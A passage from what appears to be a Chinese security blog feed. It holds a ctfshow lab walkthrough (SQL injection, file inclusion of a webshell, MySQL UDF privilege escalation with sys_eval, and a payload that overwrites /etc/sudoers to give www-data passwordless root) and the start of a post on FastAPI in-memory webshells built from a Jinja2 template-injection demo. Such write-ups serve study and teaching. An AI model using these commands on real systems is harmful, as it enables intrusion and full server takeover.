class="variable">$ctfshow</span>-&gt;<span class="variable">$m</span>==<span class="variable">$m</span> &amp;&amp; <span class="variable">$k</span>==<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG647&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG648&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;mmmmm?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evilNumber</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$number</span> = <span class="title function_ invoke__">getArray</span>(<span class="number">1000</span>,<span class="number">20</span>,<span class="number">10</span>,<span class="number">999</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$number</span>[<span class="variable">$m</span>]==<span class="variable">$m</span> &amp;&amp; <span class="variable">$k</span>==<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG648&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG649&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;number is right?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evilFunction</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$key</span> = <span class="string">&#x27;ffffffff&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$m</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$content</span>, <span class="variable">$key</span>)!==<span class="literal">FALSE</span> &amp;&amp; <span class="variable">$k</span>==<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG649&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG650&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;you are not ffffffff?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evilArray</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$arrays</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$m</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$arrays</span>!==<span class="literal">false</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;username&#x27;</span>, <span class="variable">$arrays</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;ctfshow&#x27;</span>, <span class="title function_ invoke__">get_object_vars</span>(<span class="variable">$arrays</span>)) &amp;&amp;  <span class="variable">$k</span>==<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG650&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG651&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;array?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">netTest</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;命令执行失败&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[A-Za-z]+$/&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">stripos</span>(PHP_OS,<span class="string">&#x27;WIN&#x27;</span>)!==<span class="literal">FALSE</span>?<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;GBK&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="variable">$res</span>):<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>挨个去打即可！</p><p>记点：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">$</span>content = call<span class="built_in">_</span>user<span class="built_in">_</span>func(<span class="built_in">$</span>m);</span><br><span class="line">if(stripos(<span class="built_in">$</span>content, <span class="built_in">$</span>key)!==FALSE)&#123;</span><br><span class="line">echo shell<span class="built_in">_</span>exec(&#x27;cat /FLAG/FLAG647&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个打法：getenv和session_id（获取当前的PHPSESSID）</p><p>下个环节！</p><h3 id="page-php"><a href="#page-php" class="headerlink" title="&#x2F;page.php"></a>&#x2F;page.php</h3><p>利用ssrf拿源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-07-25 16:22:25</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-07-25 16:22:25</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="keyword">__DIR__</span>.DIRECTORY_SEPARATOR.<span class="string">&#x27;system36d/util/dbutil.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]:<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//转换&#x27; &quot; \ 来实现防注入</span></span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span> = db::<span class="title function_ invoke__">get_username</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>牵扯到&#x2F;system36&#x2F;util&#x2F;deutil.php继续拿</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$host</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$username</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$password</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$database</span> = <span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$conn</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">get_conn</span>();</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select `key` from ctfshow_keys&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$res</span>) &#123;</span><br><span class="line">            <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="variable">$row</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">        <span class="built_in">self</span>::<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_username</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$conn</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">get_conn</span>();</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select `username` from ctfshow_users where id = (<span class="subst">$id</span>)&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$res</span>) &#123;</span><br><span class="line">            <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="built_in">self</span>::<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_conn</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable">$conn</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="built_in">self</span>::<span class="variable">$host</span>, <span class="built_in">self</span>::<span class="variable">$username</span>, <span class="built_in">self</span>::<span class="variable">$password</span>, <span class="built_in">self</span>::<span class="variable">$database</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$conn</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable">$conn</span> !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个sql注入闭合括号就可以打正常注入拿到key即可！</p><p>之前以为&#x2F;system36d&#x2F;util&#x2F; 403下面的文件也是403，现在看来并非，所以直接扫出个common.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;dbutil.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证 GET 参数 k 是否等于 FLAG651 的内容</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;k&#x27;</span>] !== <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG651&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;651flag未拿到&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证 POST 参数存在且文件存在，同时验证 key 与数据库中的 key 一致</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">file_exists</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (db::<span class="title function_ invoke__">get_key</span>() == <span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="keyword">__DIR__</span> . DIRECTORY_SEPARATOR . <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一个文件包含的口子，用来包含我们的马吧</p><p>法一：session包含，phpinfo里面看了下配置项开了，直接写</p><p>法二：之前init.php里面知道了备份文件的路径，我们利用恢复功能可以打</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>有马了，用蚁剑链接呗！但是权限太低了，提权咯，suid下面有一个但是用不了，不知道为啥可能和交互有关吧！这里知道数据库密码我们用udf提权！(具体怎么提可以问我)</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">#</span>由于数据库限制了文件操作的目录，所以只能配合cp命令进行操作目录了</span><br><span class="line"><span class="params">#</span>先写一个恶意的so动态链接文件</span><br><span class="line"><span class="params">#</span>然后cp移动到插件目录/udf.so</span><br><span class="line"><span class="params">#</span>创建恶意函数</span><br><span class="line">create function sys<span class="built_in">_</span>eval returns string soname &#x27;udf.so&#x27;;</span><br><span class="line"><span class="params">#</span> 看看成功没</span><br><span class="line">select * from mysql.func where name = &#x27;sys<span class="built_in">_</span>eval&#x27;;</span><br><span class="line"><span class="params">#</span> 执行命令</span><br><span class="line">select sys<span class="built_in">_</span>eval(&#x27;sudo ls /root&#x27;);</span><br><span class="line">select sys<span class="built_in">_</span>eval(&#x27;sudo cat /root/you<span class="built_in">_</span>win&#x27;);</span><br><span class="line"></span><br><span class="line">祝贺你，你已经完全控制了这台服务器，为你一路以来的坚持和努力，点赞！</span><br><span class="line"></span><br><span class="line">                  真不容易啊，师傅好样的！</span><br><span class="line"></span><br><span class="line">不过别高兴的太早，这只是第一关，后面还有更艰难的挑战，你准备好了吗！</span><br><span class="line"></span><br><span class="line">对了，这是给你的flag </span><br><span class="line"></span><br><span class="line">flag<span class="built_in">_</span>654=ctfshow&#123;4ab2c2ccd0c3c35fdba418d8502f5da9&#125; </span><br><span class="line"></span><br><span class="line">                                   ——大菜鸡 2021年8月2日02时12�</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接成功！现在是提权成功了，为了操作方便我们还是想在蚁剑的虚拟终端去执行命令而不是用sql语句去执行！一开始我的想法直接改密码不就行了，但是蚁剑的虚拟终端不是题目的shell啊，没有交互式，即使改了密码也没法输入！那么这里有另外的办法就是给www-data这个用户也添加上sudo！</p><p>需要注意的是不要去改&#x2F;etc&#x2F;sudoers这个文件的权限，这个文件的权限如果过于宽松的话就会拒绝所有的sudo命令，mysql的也不行了，就只能重开靶机再打了！所以这里我们利用cp去进行文件的移动！</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">利用前面的文件包含写入</span><br><span class="line">&lt;?php file<span class="built_in">_</span>put<span class="built_in">_</span>contents(&#x27;sudoers&#x27;,&#x27;root ALL=(ALL) ALL</span><br><span class="line">@includedir /etc/sudoers.d</span><br><span class="line">mysql ALL=(ALL:ALL) NOPASSWD:ALL</span><br><span class="line">www-data ALL=(ALL:ALL) NOPASSWD:ALL&#x27;);?&gt;</span><br><span class="line">移动</span><br><span class="line">select sys<span class="built_in">_</span>eval(&#x27;sudo cp /var/www/html/system36d/util/sudoers /etc/sudoers&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/images/achieve/2025/11/12.png"></p><h2 id="内网横向"><a href="#内网横向" class="headerlink" title="内网横向"></a>内网横向</h2><p><del>没太了解不是很会欠着</del></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> udf提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FastAPI下的内存马（未完）</title>
      <link href="/2025/11/03/FastAPI%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2025/11/03/FastAPI%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>前两天bao师傅出了fastapi的内存马，由于自己学过flask的内存马，所以参考了一篇文章很快就打通了！一开始想着原理应该都差不多吧，但是转念一想重要的应该是分析代码和探索的能力！自己这方面的能力比较弱，所以打算写篇文章学习一下（不能逃避）！</p><h2 id="fastapi-demo"><a href="#fastapi-demo" class="headerlink" title="fastapi demo"></a>fastapi demo</h2><p>fastapi其实就是python的一个框架，功能类似于是flask，都是用来创建web应用的！</p><p>一个简单的demo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI</span><br><span class="line"><span class="keyword">from</span> fastapi.responses <span class="keyword">import</span> HTMLResponse</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Environment</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line">Jinja2 = Environment()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hello World&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/hack&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">hack</span>(<span class="params">username=<span class="string">&quot;Guest&quot;</span></span>):</span><br><span class="line">    output = Jinja2.from_string(<span class="string">&quot;Welcome &quot;</span> + username).render()</span><br><span class="line">    <span class="keyword">return</span> HTMLResponse(content=output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">import</span> uvicorn</span><br><span class="line">    uvicorn.run(app, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>app是FastAPI应用实例，是整个web应用的核心！你可以简单地理解成CPU，所以后面我们后面我们去调用FastAPI的一些方法啥的都是先去找它！</p><h2 id="经典路线：路由添加函数"><a href="#经典路线：路由添加函数" class="headerlink" title="经典路线：路由添加函数"></a>经典路线：路由添加函数</h2><p>跟进过程出了点小插曲，好在bao告诉我动态跟进！花了25大洋不去上课整出来的！</p><p>首先明面上代码里面是通过<code>get(&quot;/hack&quot;)</code>这样的形式去添加路由的，但底层就如此吗？我们跟进<code>get</code></p><p><img src="/images/achieve/2025/11/7.png"></p><p>继续跟进<code>router</code></p><p><img src="/images/achieve/2025/11/8.png"></p><p>继续跟进的时候并没有发现<code>get</code>函数的定义，真奇怪！静态跟进老是直接到它父类里面去了！那就动态跟进吧</p><p><img src="/images/achieve/2025/11/9.png"></p><p>打好断点调试发现</p><p><code>self.router.get</code>这个调用是<code>APIRouter</code>这个类的get方法，最后又调用了<code>api_route</code>继续跟进</p><p><img src="/images/achieve/2025/11/10.png"></p><p>这里闭包了返回的是被装饰了的函数，继续跟进<code>add_api_route</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_api_route</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self,</span></span><br><span class="line"><span class="params">    path: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    endpoint: <span class="type">Callable</span>[..., <span class="type">Any</span>],</span></span><br><span class="line"><span class="params">    *,</span></span><br><span class="line"><span class="params">    response_model: <span class="type">Any</span> = Default(<span class="params"><span class="literal">None</span></span>),</span></span><br><span class="line"><span class="params">    status_code: <span class="type">Optional</span>[<span class="built_in">int</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    tags: <span class="type">Optional</span>[<span class="type">List</span>[<span class="type">Union</span>[<span class="built_in">str</span>, Enum]]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    dependencies: <span class="type">Optional</span>[<span class="type">Sequence</span>[params.Depends]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    summary: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    description: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    response_description: <span class="built_in">str</span> = <span class="string">&quot;Successful Response&quot;</span>,</span></span><br><span class="line"><span class="params">    responses: <span class="type">Optional</span>[<span class="type">Dict</span>[<span class="type">Union</span>[<span class="built_in">int</span>, <span class="built_in">str</span>], <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    deprecated: <span class="type">Optional</span>[<span class="built_in">bool</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    methods: <span class="type">Optional</span>[<span class="type">Union</span>[<span class="type">Set</span>[<span class="built_in">str</span>], <span class="type">List</span>[<span class="built_in">str</span>]]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    operation_id: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    response_model_include: <span class="type">Optional</span>[IncEx] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    response_model_exclude: <span class="type">Optional</span>[IncEx] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    response_model_by_alias: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">    response_model_exclude_unset: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    response_model_exclude_defaults: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    response_model_exclude_none: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    include_in_schema: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">    response_class: <span class="type">Union</span>[<span class="type">Type</span>[Response], 